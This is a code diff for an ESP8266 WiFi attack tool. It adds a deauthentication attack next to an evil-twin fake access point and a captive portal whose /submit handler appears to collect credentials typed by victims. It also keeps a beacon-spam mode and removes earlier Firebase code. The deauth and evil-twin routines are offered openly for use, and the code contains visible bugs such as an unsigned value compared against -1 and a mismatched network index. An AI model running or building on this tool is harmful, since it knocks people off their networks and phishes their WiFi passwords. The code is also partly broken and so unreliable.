@@ -2,31 +2,23 @@
 #include "View.h"
 #include "WebPortal.h"
 #include "NetworkList.h"
-#include "FirebaseCom.h"
 #include "BeaconSpam.h"
 #include "Deauther.h"
 
-using namespace View;
-using namespace WebPortal;
-using namespace FirebaseCom;
-
 IPAddress local_IP(192,168,4,22);
 IPAddress subnet(255,255,255,0);
-
-FirebaseData FBdata;
-FirebaseAuth auth;
-FirebaseConfig config;
 
 ESP8266WebServer server(DEFAULT_PORT);
 DNSServer dnsServer;
 
 NetworkList networks;
 
-String SSID;
+String custom_AP_SSID;
 bool apStarted = false; // to see if there is a point running
 bool internetConnection = false;
 bool attacking = false; //if any attacks are happening
 bool beaconSpamAttack = false;
+bool deauthAttack = false;
 
 void setup() {
 
@@ -65,11 +57,16 @@ void setup() {
 
 
 void loop(){
+    main();
+    delay(10);
+}
+
+void main(){
     if (!attacking){
 
-        printInstruction();
+        View::printInstruction();
         uint8_t menuInput=0;
-        getIntInput(menuInput);
+        View::getIntInput(menuInput);
 
         switch (menuInput){
             case 1:
@@ -79,8 +76,6 @@ void loop(){
                 evilTwin();
                 break;
             case 3:
-                Serial.print("Enter custom SSID: ");
-                getStrInput(SSID);
                 createAP();
                 attacking = true;
                 break;
@@ -90,20 +85,47 @@ void loop(){
                     attacking = true;
                 }
                 break;
+            case 5:
+                if(deauthSetup()){
+                    deauthAttack = true;
+                    attacking = true;
+                }
+                break;
+            case 6: // control attacks
+            break;
             default:
                 Serial.println("Enter a Valid Answer: ");
-                printInstruction();
+                View::printInstruction();
                 break;
         }
     } else{
-        if(beaconSpamAttack) beaconSpam();
+        if(beaconSpamAttack) handleBeaconSpam();
+        if(deauthAttack) handleDeauthAttack();
 
         if(apStarted){
             dnsServer.processNextRequest();
             server.handleClient();
         }
     }
-            
+}
+
+uint8_t getNetworkIndex(){
+    if(networks.getSize() == 0){
+        Serial.println("No networks observed.");
+        return;
+    }
+
+    Serial.print("\nWhich network # to mimic: ");
+    uint8_t networkNum;
+    View::getIntInput(networkNum);
+    Serial.printf("\nChosing network #%d\n", networkNum);
+
+    if(networkNum >= 0 && networkNum <= networks.getSize()){
+        return networkNum -1;
+    }else{
+        Serial.println("Invalid network number.");
+    }
+    return -1;
 }
 
 void findNewNetworks(){
@@ -130,36 +152,27 @@ void findNewNetworks(){
 }
 
 void evilTwin(){
-    if(networks.getSize() == 0){
-        Serial.println("No networks observed.");
-        return;
-    }
-
-    
-    Serial.print("\nWhich network # to mimic: ");
-    uint8_t networkNum;
-    getIntInput(networkNum);
-    Serial.printf("\nChosing network #%d\n", networkNum);
-
-    if(networkNum >= 0 && networkNum <= networks.getSize()){
-        SSID = *networks.getSSID(networkNum-1);
+    uint8_t networkNum = getNetworkIndex();
+    if(networkNum != -1){
+        custom_AP_SSID = *networks.getSSID(networkNum-1);
         attacking = createAP();
-    }else{
-        Serial.println("Invalid network number.");
     }
 }
 
 bool createAP(){
+    Serial.print("Enter custom SSID: ");
+    View::getStrInput(custom_AP_SSID);
+
     Serial.print("Creating network: ");
-    Serial.println(SSID);
+    Serial.println(custom_AP_SSID);
     
     if (!WiFi.softAPConfig(local_IP, local_IP, subnet)) {
         Serial.println("Failed to configure AP");
         return false;
     }
     
-    //WiFi.softAP(SSID, AP_PASSWORD,1, false, 4)
-    if (!WiFi.softAP(SSID)) {
+    //WiFi.softAP(custom_AP_SSID, AP_PASSWORD,1, false, 4)
+    if (!WiFi.softAP(custom_AP_SSID)) {
         Serial.println("Failed to start AP");
         return false;
     }
@@ -176,11 +189,11 @@ bool createAP(){
     Serial.println(WiFi.softAPIP());
 
     server.onNotFound([]() {
-        handleConnect();
+        WebPortal::handleConnect();
     });
 
     server.on("/submit", []() {
-        handleSubmit();
+        WebPortal::handleSubmit();
     });
     //server.onNotFound(handleNotFound);
     server.begin();
@@ -189,4 +202,13 @@ bool createAP(){
     return true;
 }
 
+void handleBeaconSpam(){
+    beaconSpam();
+}
 
+void handleDeauthAttack(){
+    uint8_t networkNum = getNetworkIndex();
+    if(networkNum != -1){
+        deauthNetwork(networks.getChannel(networkNum), networks.getBSSID(networkNum));
+    }
+}
